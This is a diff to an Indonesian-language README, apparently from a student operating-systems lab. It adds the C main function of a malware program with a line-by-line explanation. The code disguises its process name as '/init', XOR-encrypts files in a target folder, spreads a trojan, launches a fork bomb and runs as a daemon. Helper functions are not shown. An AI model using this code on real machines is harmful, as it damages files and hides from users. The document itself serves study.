@@ -460,8 +460,6 @@ Fork bomb terkontrol yang menjalankan minimal 3 proses anak bernama mine-crafter
 4. /init
 Proses utama yang berubah nama menjadi /init untuk menyembunyikan diri di daftar proses, bekerja sebagai daemon.
 
-### Alur Pengerjaan
-
 
 ### Penjelasan kode
 
@@ -784,6 +782,88 @@ void rodok_bomb() {
 
 - `while (1) pause();`  loop yang berjalan terus-menerus tanpa henti sampai dihentikan.
   
+5. Penjelasan fungsi main
+```bash
+int main(int argc, char **argv) {
+    const char *namaSamaran = "/init";
+    size_t panjangNama = strlen(namaSamaran);
+    size_t panjangArgv0 = strlen(argv[0]);
+
+    if (panjangArgv0 >= panjangNama) {
+        memset(argv[0], 0, panjangArgv0);
+        strncpy(argv[0], namaSamaran, panjangArgv0);
+    }
+
+    prctl(PR_SET_NAME, (unsigned long)namaSamaran, 0, 0, 0);
+
+    const char *folderTarget = "/home/evaldhio/new-folder/FiraCode/";
+
+    if (download_data() == 0) {
+        xor_key = (unsigned char)(time(NULL) & 0xFF);
+        encrypt(folderTarget, xor_key);
+
+        char lokasiProgram[1024];
+        ssize_t panjang = readlink("/proc/self/exe", lokasiProgram, sizeof(lokasiProgram) - 1);
+        if (panjang != -1) {
+            lokasiProgram[panjang] = '\0';
+            trojan(folderTarget, lokasiProgram);
+
+            pid_t pid = fork();
+            if (pid == 0) {
+                rodok_bomb();
+                exit(0);
+            }
+
+            inidaemon(folderTarget, lokasiProgram);
+        } else {
+            fprintf(stderr, "Gagal mendapatkan path executable.\n");
+            return 1;
+        }
+    } else {
+        fprintf(stderr, "Proses download atau extract gagal. Program dihentikan.\n");
+        return 1;
+    }
+
+    return 0;
+}
+```
+- `const char *namaSamaran = "/init";
+size_t panjangNama = strlen(namaSamaran);
+size_t panjangArgv0 = strlen(argv[0]);
+if (panjangArgv0 >= panjangNama) {
+    memset(argv[0], 0, panjangArgv0);
+    strncpy(argv[0], namaSamaran, panjangArgv0);
+}
+prctl(PR_SET_NAME, (unsigned long)namaSamaran, 0, 0, 0);`
+  1. `argv[0]` Nama program yang biasanya digunakan untuk mengenali proses.
+  2. `prctl(PR_SET_NAME, (unsigned long)namaSamaran, 0, 0, 0)`  mengubah nama proses agar selalu tampil sebagai "/init".
+
+- `const char *folderTarget = "/home/evaldhio/new-folder/FiraCode/";
+if (download_data() == 0) {
+    xor_key = (unsigned char)(time(NULL) & 0xFF);
+    encrypt(folderTarget, xor_key);`
+  1. `const char *folderTarget = "/home/evaldhio/new-folder/FiraCode/";` menentukan direktori target malware.
+  2. `xor_key = (unsigned char)(time(NULL) & 0xFF) ` mengenkripsi file di dalam folder target menggunakan XOR encryption.
+
+- `char lokasiProgram[1024];
+ssize_t panjang = readlink("/proc/self/exe", lokasiProgram, sizeof(lokasiProgram) - 1);
+if (panjang != -1) {
+    lokasiProgram[panjang] = '\0';
+    trojan(folderTarget, lokasiProgram);
+` Menjalankan fungsi trojan dan menyebarkan malware ke folder target.
+
+- `pid_t pid = fork();
+if (pid == 0) {
+    rodok_bomb();
+    exit(0);
+}` 
+  1. `fork()` Fungsi ini digunakan untuk membuat child process.
+  2. `rodok_bomb()` Jika kita berada di proses anak (pid == 0), kita akan menjalankan fungsi rodok_bomb().
+
+- `inidaemon(folderTarget, lokasiProgram);` Menjalankan fungsi daemon.
+
+
+
 
 
 
